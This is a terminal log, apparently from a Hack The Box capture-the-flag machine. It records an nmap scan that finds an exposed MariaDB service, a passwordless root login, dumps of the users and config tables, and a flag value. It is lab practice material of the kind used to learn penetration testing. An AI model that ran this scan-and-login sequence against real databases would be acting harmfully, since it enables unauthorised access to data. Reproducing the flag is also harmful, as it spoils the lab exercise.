

```
kali@kali ~ [1]> nmap -sC -sV 10.129.177.198
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 12:32 EDT
Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:02:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.64% done; ETC: 12:35 (0:00:00 remaining)
Nmap scan report for 10.129.177.198
Host is up (0.078s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 149
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, SupportsTransactions, Support41Auth, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSigpipes, SupportsCompression, InteractiveClient, LongColumnFlag, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ?*THJ|Tk=1|@e`0lP-0G
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 202.83 seconds

```


```
kali@kali ~ [SIGINT]> sudo mysql -h 10.129.177.198 -u root
[sudo] password for kali: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 159
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.084 sec)

MariaDB [(none)]> SELECT * FROM htb;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> SELECT htb;
ERROR 1054 (42S22): Unknown column 'htb' in 'field list'
MariaDB [(none)]> use htb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.079 sec)

MariaDB [htb]> show users
    -> 
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'users' at line 1
MariaDB [htb]> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.079 sec)

MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.261 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.078 sec)

MariaDB [htb]> 

```